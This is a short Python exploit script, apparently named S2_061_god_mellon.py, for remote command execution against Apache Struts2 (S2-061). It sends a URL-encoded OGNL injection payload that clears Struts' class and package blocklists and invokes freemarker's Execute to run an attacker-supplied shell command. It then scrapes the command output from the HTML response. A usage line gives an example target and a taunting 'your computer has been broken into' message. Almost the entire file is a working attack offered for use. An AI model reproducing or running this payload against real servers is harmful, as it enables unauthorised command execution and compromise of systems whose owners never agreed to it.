#encoding=utf-8
#god_mellon
import requests
import  re
import sys



def poc(url,cmd,a):
    end_url=url+payload
    resp=requests.get(end_url)
    resp=resp.text
    pattern=re.compile(r'<a.*')
    resp_a=pattern.findall(resp)
    resp_a=''.join(resp_a)
    resp_rm_a= re.sub(r"<a", ' ', resp_a)
    resp_rm_a=''.join(resp_rm_a)
    resp_rm_yin= re.sub(a,' ', resp_rm_a)
    print('命令执行完成,部分多行命令无回显>>>>',resp_rm_yin)
    print()
    print()
    print()
    sys.exit()

if __name__ == '__main__':
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
        #url=input('请输入url:')
        #cmd=input('请输入要执行的命令')
        cmd = ''.join(cmd)
        a = 'id'+ '="'
        payload = '?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27' + cmd + '%27}).(%23res%3d%23exec.exec(%23cmd))}'
        poc(url,cmd,a)
    finally:
        print("USEAGE: url cmd")
        print("python S2_061_god_mellon.py http://192.168.56.109:59018/  CUCRock已经攻破你的电脑啦")